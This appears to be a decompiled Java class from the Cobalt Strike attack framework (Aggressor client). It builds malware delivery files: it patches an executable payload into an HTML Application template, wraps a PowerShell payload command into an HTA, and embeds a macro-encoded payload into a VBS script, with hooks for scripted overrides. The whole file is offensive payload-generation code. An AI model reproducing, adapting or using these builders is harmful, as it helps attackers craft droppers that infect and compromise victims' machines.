package common;

import aggressor.AggressorClient;
import java.util.Stack;
import sleep.runtime.SleepUtils;

public class MutantResourceUtils {
   protected AggressorClient client;

   public MutantResourceUtils(AggressorClient var1) {
      this.client = var1;
   }

   public byte[] getScriptedResource(String var1, Stack var2) {
      String var3 = this.client.getScriptEngine().format(var1, var2);
      return var3 == null ? new byte[0] : CommonUtils.toBytes(var3);
   }

   public byte[] getScriptedResource(String var1, byte[] var2, String var3) {
      Stack var4 = new Stack();
      var4.push(SleepUtils.getScalar(var3));
      var4.push(SleepUtils.getScalar(var2));
      return this.getScriptedResource(var1, var4);
   }

   public byte[] getScriptedResource(String var1, byte[] var2) {
      Stack var3 = new Stack();
      var3.push(SleepUtils.getScalar(var2));
      return this.getScriptedResource(var1, var3);
   }

   public byte[] buildHTMLApplicationEXE(byte[] var1, String var2) {
      byte[] var3 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.exe");
      byte[] var4 = this.getScriptedResource("HTMLAPP_EXE", var3, var2);
      return var4.length == 0 ? this._buildHTMLApplicationEXE(var3, var2) : var4;
   }

   public byte[] _buildHTMLApplicationEXE(byte[] var1, String var2) {
      String var3 = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp.txt"));
      var3 = CommonUtils.strrep(var3, "##EXE##", ArtifactUtils.toHex(var1));
      var3 = CommonUtils.strrep(var3, "##NAME##", var2);
      return CommonUtils.toBytes(var3);
   }

   public byte[] buildHTMLApplicationPowerShell(byte[] var1) {
      byte[] var2 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var1);
      byte[] var3 = this.getScriptedResource("HTMLAPP_POWERSHELL", var2);
      return var3.length == 0 ? this._buildHTMLApplicationPowerShell(var2) : var3;
   }

   public byte[] _buildHTMLApplicationPowerShell(byte[] var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp2.txt"));
      var2 = CommonUtils.strrep(var2, "%%DATA%%", CommonUtils.bString(var1));
      return CommonUtils.toBytes(var2);
   }

   public byte[] buildVBS(byte[] var1) {
      byte[] var2 = (new ResourceUtils(this.client)).buildMacro(var1);
      byte[] var3 = this.getScriptedResource("RESOURCE_GENERATOR_VBS", var2);
      return var3.length == 0 ? this._buildVBS(var2) : var3;
   }

   public byte[] _buildVBS(byte[] var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource("resources/template.vbs")).trim();
      var2 = CommonUtils.strrep(var2, "$$CODE$$", ArtifactUtils.toVBS(var1));
      return CommonUtils.toBytes(var2);
   }
}
